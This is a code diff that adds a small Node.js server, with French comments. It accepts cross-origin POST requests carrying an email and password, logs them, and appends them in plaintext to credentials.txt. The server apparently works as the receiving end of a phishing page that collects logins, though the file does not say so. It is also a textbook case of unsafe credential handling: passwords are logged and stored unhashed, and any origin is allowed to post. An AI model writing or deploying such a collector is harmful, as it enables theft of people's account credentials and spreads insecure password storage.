@@ -1,0 +1,73 @@
+const http = require('http');
+const fs = require('fs');
+
+const requestListener = (req, res) => {
+    console.log(`Méthode : ${req.method}, URL : ${req.url}`); // Log de la méthode et de l'URL
+
+    // En-têtes CORS
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
+    if (req.method === 'OPTIONS') {
+        res.writeHead(204);
+        res.end();
+        return;
+    }
+
+    if (req.method === 'GET' && req.url === '/store') {
+        res.writeHead(200, { 'Content-Type': 'text/plain' });
+        res.end('Cette route accepte uniquement des requêtes POST.');
+        return;
+    }
+
+    if (req.method === 'POST' && req.url === '/store') {
+        let body = '';
+
+        req.on('data', chunk => {
+            console.log('Chunk reçu :', chunk.toString()); // Log des données reçues
+            body += chunk.toString();
+        });
+
+        req.on('end', () => {
+            try {
+                const data = JSON.parse(body); // Analyse JSON
+                const { email, password } = data;
+
+                if (email && password) {
+                    const entry = `Email: ${email}, Password: ${password}\n`;
+
+                    fs.appendFile('credentials.txt', entry, err => {
+                        if (err) {
+                            console.error('Erreur lors de l\'écriture dans le fichier :', err);
+                            res.writeHead(500, { 'Content-Type': 'text/plain' });
+                            res.end('Erreur lors de l\'enregistrement.');
+                        } else {
+                            res.writeHead(200, { 'Content-Type': 'text/plain' });
+                            res.end('Informations enregistrées avec succès.');
+                        }
+                    });
+                } else {
+                    res.writeHead(400, { 'Content-Type': 'text/plain' });
+                    res.end('Données invalides. Email et mot de passe requis.');
+                }
+            } catch (err) {
+                console.error('Erreur JSON :', err);
+                res.writeHead(400, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ error: 'Données JSON invalides.' }));
+            }
+        });
+
+        return;
+    }
+
+    res.writeHead(404, { 'Content-Type': 'text/plain' });
+    res.end('Route non trouvée.');
+};
+
+const server = http.createServer(requestListener);
+
+const PORT = 3000;
+server.listen(PORT, () => {
+    console.log(`Serveur démarré sur http://localhost:${PORT}`);
+});
